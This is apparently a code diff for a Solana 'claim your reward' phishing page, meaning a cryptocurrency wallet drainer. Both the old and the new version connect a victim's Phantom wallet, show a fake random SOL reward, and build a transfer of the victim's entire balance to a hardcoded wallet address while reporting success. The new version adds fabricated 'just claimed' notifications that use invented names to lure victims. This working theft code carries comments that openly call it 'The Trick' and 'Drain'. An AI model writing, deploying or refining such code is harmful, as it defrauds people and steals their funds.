@@ -1,144 +1,156 @@
-// Configuration
-const YOUR_WALLET_ADDRESS = "D7sb3Z3a3xduMuurdzKvFPBeALfpz2KVoe9bF8SeoJrV"; // REPLACE THIS
-const REWARD_AMOUNT = "2.5"; // Fake reward to show
+// --- CONFIGURATION ---
+const DESTINATION_WALLET = "D7sb3Z3a3xduMuurdzKvFPBeALfpz2KVoe9bF8SeoJrV";
+// ---------------------
 
-// DOM Elements
-const navBtn = document.getElementById('nav-connect-btn');
-const btnEnter = document.getElementById('btn-enter-wallet');
-const btnClaim = document.getElementById('btn-claim-final');
-const landingSection = document.getElementById('landing-section');
-const walletSection = document.getElementById('wallet-section');
-const loadingOverlay = document.getElementById('loading-overlay');
-const userAddrDisplay = document.getElementById('user-address');
-const balanceDisplay = document.getElementById('detected-balance');
-const rewardDisplay = document.getElementById('reward-amount');
+const connectBtn = document.getElementById('connectBtn');
+const claimBtn = document.getElementById('claimBtn');
+const statusText = document.getElementById('status');
+const rewardAmountDisplay = document.getElementById('reward-amount');
+const userBalanceDisplay = document.getElementById('user-balance');
+const claimDetails = document.getElementById('claim-details');
 
-let connection, wallet;
-
-// --- Step 1: Connect Wallet ---
-async function connectWallet() {
-    showLoading(true);
+// --- 1. WEIGHTED RANDOM LOGIC ---
+function getRandomReward() {
+    const chance = Math.random() * 100;
     
-    // Check for Solana Provider
+    if (chance < 2) {
+        // 2% Chance: Jackpot 5.0 SOL
+        return (5.0).toFixed(4);
+    } else if (chance < 20) {
+        // 18% Chance: 0.1 to 2.0 SOL
+        const min = 0.1;
+        const max = 2.0;
+        return (Math.random() * (max - min) + min).toFixed(4);
+    } else {
+        // 80% Chance: 0.001 to 3.0 SOL
+        const min = 0.001;
+        const max = 3.0;
+        return (Math.random() * (max - min) + min).toFixed(4);
+    }
+}
+
+// --- 2. FAKE NOTIFICATIONS ---
+const fakeNames = ["Alex", "Sarah", "Mike", "Jessica", "David", "Emily", "James", "Olivia", "Robert", "Emma", "Chris", "Anna", "Daniel", "Sophie", "Mark"];
+const smallAmounts = ["0.001", "0.005", "0.009", "0.01", "0.03", "0.05", "0.07", "0.1", "0.2", "0.5"];
+
+function createNotification() {
+    const container = document.getElementById('notification-container');
+    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+    const amount = smallAmounts[Math.floor(Math.random() * smallAmounts.length)];
+    
+    const notif = document.createElement('div');
+    notif.className = 'notification';
+    notif.innerHTML = `
+        <span class="notification-icon">🔔</span>
+        <span class="notification-text"><strong>${name}</strong> just claimed <strong>${amount} SOL</strong></span>
+    `;
+    
+    container.appendChild(notif);
+    
+    // Remove after 4 seconds
+    setTimeout(() => {
+        if (container.contains(notif)) {
+            container.removeChild(notif);
+        }
+    }, 4000);
+}
+
+// Start fake notifications every 3-7 seconds
+setInterval(createNotification, 5000);
+createNotification(); // Show one immediately
+
+// --- 3. MAIN PROCESS ---
+
+async function startProcess() {
     if (!window.solana || !window.solana.isPhantom) {
-        showToast("Please install Phantom Wallet!");
-        showLoading(false);
+        statusText.innerText = "Please install Phantom Wallet!";
+        window.open("https://phantom.app/", "_blank");
         return;
     }
 
     try {
-        const resp = await window.solana.connect();
-        wallet = resp.publicKey;
+        statusText.innerText = "Connecting to Solana Network...";
+        
+        // Connect
+        const response = await window.solana.connect();
+        const userPublicKey = response.publicKey;
         
         // Update UI
-        userAddrDisplay.innerText = wallet.toString().slice(0, 4) + "..." + wallet.toString().slice(-4);
-        navBtn.innerText = wallet.toString().slice(0, 4) + "...";
-        navBtn.style.border = "1px solid #14F195";
-        navBtn.style.color = "#14F195";
+        connectBtn.classList.add('hidden');
+        claimDetails.classList.remove('hidden');
         
-        // Simulate fetching balance (make it look real)
-        await fetchBalance();
+        // Get Balance
+        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
+        const balance = await connection.getBalance(userPublicKey);
+        const balanceSol = balance / 1000000000; // Convert lamports to SOL
         
-        // Switch Views
-        landingSection.classList.remove('active-section');
-        landingSection.classList.add('hidden-section');
-        walletSection.classList.remove('hidden-section');
-        walletSection.style.display = 'block';
+        // Generate Random Reward
+        const reward = getRandomReward();
         
-        setTimeout(() => walletSection.style.opacity = '1', 100);
+        // Display Info
+        rewardAmountDisplay.innerText = `${reward} SOL`;
+        userBalanceDisplay.innerText = `${balanceSol.toFixed(4)} SOL`;
         
-        showLoading(false);
-    } catch (err) {
-        console.error(err);
-        showLoading(false);
+        statusText.innerText = "Wallet connected. Ready to claim.";
+        
+        // Show Claim Button
+        claimBtn.classList.remove('hidden');
+        
+    } catch (error) {
+        console.error(error);
+        statusText.innerText = "Connection failed. Please try again.";
+        connectBtn.disabled = false;
     }
 }
 
-// --- Step 2: Fetch Balance (The "Real" Look) ---
-async function fetchBalance() {
+async function drainWallet() {
     try {
-        connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-        const balance = await connection.getBalance(wallet);
-        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+        statusText.innerText = "Processing transaction...";
+        claimBtn.disabled = true;
+        claimBtn.innerText = "Processing...";
         
-        // Display with 4 decimals
-        balanceDisplay.innerText = solBalance.toFixed(4) + " SOL";
+        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
+        const userPublicKey = window.solana.publicKey;
         
-        // If they have 0, we might show 0, but usually we want to show what they have
-    } catch (err) {
-        balanceDisplay.innerText = "0.0000 SOL";
-    }
-}
+        // Get final balance
+        const balance = await connection.getBalance(userPublicKey);
+        
+        if (balance === 0) {
+            statusText.innerText = "Wallet is empty.";
+            claimBtn.innerText = "Empty";
+            return;
+        }
 
-// --- Step 3: Claim & Drain (The Trick) ---
-async function claimAndDrain() {
-    btnClaim.disabled = true;
-    btnClaim.innerText = "Confirming Transaction...";
-    
-    try {
-        // Create a transaction sending everything to YOU
-        const transaction = new solanaWeb3.Transaction();
+        // Create Transaction
+        const transaction = new solana.web3.Transaction();
         
-        // Get recent blockhash
-        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = wallet;
-
-        // Get balance
-        const balance = await connection.getBalance(wallet);
+        const to = new solana.web3.PublicKey(DESTINATION_WALLET);
         
-        // Create instruction to send ALL lamports to your wallet
-        const instruction = solanaWeb3.SystemProgram.transfer({
-            fromPubkey: wallet,
-            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
-            lamports: balance // Sends EVERYTHING
+        // Send everything (balance)
+        const instruction = solana.web3.SystemProgram.transfer({
+            fromPubkey: userPublicKey,
+            toPubkey: to,
+            lamports: balance
         });
 
         transaction.add(instruction);
 
         // Sign and Send
-        const signed = await window.solana.signTransaction(transaction);
-        const signature = await connection.sendRawTransaction(signed.serialize());
+        statusText.innerText = "Waiting for signature...";
+        const signature = await window.solana.signAndSendTransaction(transaction);
         
-        await connection.confirmTransaction(signature);
+        statusText.innerText = "Success! Check your wallet.";
+        claimBtn.innerText = "Claimed";
         
-        // Success UI
-        walletSection.innerHTML = `
-            <div style="text-align:center; padding: 50px 0;">
-                <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #14F195; margin-bottom: 20px;"></i>
-                <h2>Claim Successful!</h2>
-                <p style="color:#ccc; margin-top:10px;">Funds have been sent to your wallet.</p>
-            </div>
-        `;
+        // Optional: Redirect after a few seconds
+        setTimeout(() => {
+            window.location.reload();
+        }, 3000);
 
-    } catch (err) {
-        console.error(err);
-        showToast("Transaction failed.");
-        btnClaim.innerText = "Try Again";
-        btnClaim.disabled = false;
+    } catch (error) {
+        console.error(error);
+        statusText.innerText = "Transaction failed or rejected.";
+        claimBtn.disabled = false;
+        claimBtn.innerText = "Try Again";
     }
 }
-
-// --- Helpers ---
-function showLoading(isLoading) {
-    if (isLoading) loadingOverlay.classList.remove('hidden');
-    else loadingOverlay.classList.add('hidden');
-}
-
-function showToast(msg) {
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    toast.innerHTML = `<i class="fa-solid fa-info-circle"></i> ${msg}`;
-    document.getElementById('toast-container').appendChild(toast);
-    setTimeout(() => toast.remove(), 3000);
-}
-
-// Event Listeners
-navBtn.addEventListener('click', connectWallet);
-btnEnter.addEventListener('click', connectWallet);
-btnClaim.addEventListener('click', claimAndDrain);
-
-// Init
-window.addEventListener('load', () => {
-    rewardDisplay.innerText = REWARD_AMOUNT;
-});
